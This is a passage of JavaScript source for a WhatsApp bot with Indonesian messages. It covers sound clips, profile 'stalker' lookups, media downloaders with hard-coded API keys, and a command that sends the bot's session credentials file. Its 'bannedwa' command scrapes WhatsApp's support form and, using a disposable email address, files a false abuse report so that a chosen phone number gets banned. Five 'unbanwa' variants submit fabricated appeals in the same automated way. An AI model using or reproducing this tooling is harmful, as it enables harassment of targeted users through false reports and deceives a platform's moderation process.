"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./YaeMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await XeonBotInc.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://instagram.com/Cyaa_ches1', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://instagram.com/Cyaa_ches1',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await XeonBotInc.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break
  //GAME tebak kata Function

case 'friend':
case 'searchfriend':{
reply(mess.wait)
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcxeon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
XeonBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'sc':
case 'donate':
case 'script':
case 'donasi': {
replygcxeon('Halo! Terimakasih telah menggunakan bot ini. Jika Anda ingin membantu pengembangan bot ini, maka Anda dapat melakukan donasi melalui halaman berikut:\nhttps://saweria.co/Danzzbotwa \n Terimakasih atas dukungan Anda!')
}
break
case 'getsession':
if (!XeonTheCreator) return XeonStickOwner()
replygcxeon('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./session/creds.json')
XeonBotInc.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break

case 'request': case 'reportbug': {
  reply(mess.wait)
	if (!text) return replygcxeon(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
XeonBotInc.sendMessage(i + "@s.whatsapp.net", {
text: textt + teks1,
mentions: [m.sender],
}, {
quoted: m,
})
            }
            XeonBotInc.sendMessage(m.chat, {
text: textt + teks2 + teks1,
mentions: [m.sender],
            }, {
quoted: m,
            })

        }
        break
case 'q': case 'quoted': {
if (!m.quoted) return replygcxeon('Reply the Message!!')
let xeonquotx= await XeonBotInc.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replygcxeon('The message you are replying to is not sent by the bot')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'igstalk2':{
reply(mess.wait)
if (!q) return replygcxeon(`Example ${prefix+command} unicorn_xeon`)
reply(mess.wait)
const aj = await igstalk(`${q}`)
XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*/ Instagram Stalker \\*

Full name : ${aj.fullname}
Username : ${aj.username}
Post : ${aj.post}
Followers : ${aj.followers}
Following : ${aj.following}
Bio : ${aj.bio}` }, { quoted: m } )
}
break
case 'ffstalk':{
reply(mess.wait)
if (!q) return replygcxeon(`Example ${prefix+command} 946716486`)
reply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
replygcxeon(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'mlstalk': {
reply(mess.wait)
if (!q) return replygcxeon(`Example ${prefix+command} 530793138|8129`)
reply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcxeon(`*/ Mobile Legend Stalker \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'npmstalk':{
  reply(mess.wait)
if (!q) return replygcxeon(`Example ${prefix+command} xeonapi`)
reply(mess.wait)
eha = await npmstalk.npmstalk(q)
replygcxeon(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
//=========================================\\

//=========================================\\
case 'tiktok':
case 'tt': {
  if (!text) return replygcxeon(`Contoh: ${prefix + command} link`);
  reply(mess.wait);
  try {
  const data = await fetchJson(`https://skizo.tech/api/tiktok?url=${encodeURIComponent(text)}&apikey=dzsyabotz`);
    const videoUrl = data.data.play;
    const authorNickname = data.data.author ? data.data.author.nickname : "Author None";
    const videoTitle = data.data ? data.data.title : "Judul Video Tidak Tersedia";
    const videoDuration = data.data ? data.data.duration : "Durasi Video Tidak Tersedia";
    const videoCaption = `*Author* : ${authorNickname}\n*judul* : ${videoTitle}\n*Durasi* : ${videoDuration}` || "videonya kak";

    XeonBotInc.sendMessage(m.chat, { caption: videoCaption, video: { url: videoUrl } }, { quoted: m });
	} catch (e) {
	 reply(`Maap sedang error silakan coba lagi`)            
	}
}
break;
//==============================================
case 'instagram':
case 'igdl':
case 'ig': {
  if (!text) return replygcxeon(`Contoh: ${prefix + command} link`);
  reply(mess.wait);
  let data = await fetchJson(`https://vihangayt.me/download/instagram?url=${encodeURIComponent(text)}`);
    const videoUrl = data.url;
    const videoCaption = "Video Instagram Nya";
    XeonBotInc.sendMessage(m.chat, { caption: 'ini dia video Instagram nya', video: { url: videoUrl } }, { quoted: m });

}
break;

case 'snackvideo': {
  if (!text) return reply(mess.query.link)
  reply(mess.query.link)
const data = fetchJson(`https://api.lolhuman.xyz/api/snackvideo?apikey=Akiraa&url=${encodeURIComponent(text)}`)
const vidnya = data.result.url;
const cption = data.result.caption|| "nih kak"
XeonBotInc.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break

case 'tiktokaudio':{
if (!text) return replygcxeon( `Example : ${prefix + command} link`)
reply(mess.wait);
if (!q.includes('tiktok')) return replygcxeon(`Link Invalid!!`)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break

case 'ghstalk': case 'githubstalk':{
reply(mess.wait)
if (!q) return replygcxeon(`Example ${prefix+command} DGXeon`)
reply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

case 'unbanwa': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Tunggu 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break




case 'unbanwav2': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replygcxeon(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)

let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break


case 'unbanwav3': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replygcxeon(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Halo WhatsApp
Saat ini, beberapa orang memiliki banyak cara efektif untuk memblokir nomor pengguna dan melaporkannya tanpa alasan apa pun, pada kenyataannya, saya mengetahui persyaratan layanan dengan baik dan saya mengikutinya, tetapi beberapa peretas membuat laporan palsu kepada saya dan nomor saya diblokir, buka blokir nomor ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break


case 'unbanwav4': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replygcxeon(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Selamat siang tim WhatsApp. Akun WhatsApp saya telah dibakar secara permanen, mohon saya mohon agar Anda membuka blokirnya, saya tidak dapat menggunakan nomor lain lagi. Saya tidak tahu mengapa itu dibakar tetapi teman saya menyarankannya karena saya menggunakan GB WhatsApp, dan saya tidak tahu itu salah. Nomor saya adalah [ ${targetnya} ]. Tolong tim WhatsApp, bantu saya membuka blokir akun saya. tolong saya tidak dapat menggunakan nomor baru karena nomor saya saat ini terhubung ke slot hal-hal penting seperti lowongan.
Terima kasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break
//=================================================
case 'unbanwav5': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Halo WhatsApp, nomor saya telah dicuri oleh peretas, silakan buka kuncinya [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replygcxeon(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replygcxeon(util.format(res.data))
} catch (err) {replygcxeon(`${err}`)}
} else replygcxeon('Masukkan nomor target!')
}
break
//=================================================



case 'bannedwa': {
if (!XeonTheCreator) return XeonStickOwner()
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replygcxeon(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Saya perhatikan ada pengguna yang menggunakan whatsapp yang dimodifikasi, jadi saya meminta dukungan untuk memblokir akun ini karena melanggar persyaratan layanan, dan akun tersebut menggunakan bot WhatsApp yang dapat mengirim pesan jahat sehingga WhatsApp pengguna lain tidak dapat berfungsi.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replygcxeon(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replygcxeon(`##- WhatsApp Support -##

Sepertinya Anda menggunakan atau mengajukan pertanyaan mengenai versi WhatsApp yang tidak resmi.

Untuk memastikan Anda memiliki akses ke WhatsApp, verifikasi ulang nomor telepon Anda menggunakan aplikasi resmi kami yang dapat diunduh dari situs web kami: www.whatsapp.com/download

Aplikasi tidak resmi membahayakan keamanan dan keselamatan Anda, dan kami tidak mendukungnya.

Berikut yang mungkin terjadi jika Anda menggunakannya:

Tidak ada jaminan bahwa pesan atau data Anda seperti lokasi Anda atau file yang Anda bagikan akan bersifat privat dan aman.

Akun mungkin akan diblokir karena penggunaan aplikasi WhatsApp yang tidak resmi bertentangan dengan Ketentuan Layanan kami.

Berikut adalah ketentuan layanan WhatsApp:

Ketentuan Layanan WhatsApp

1. Penggunaan Aplikasi

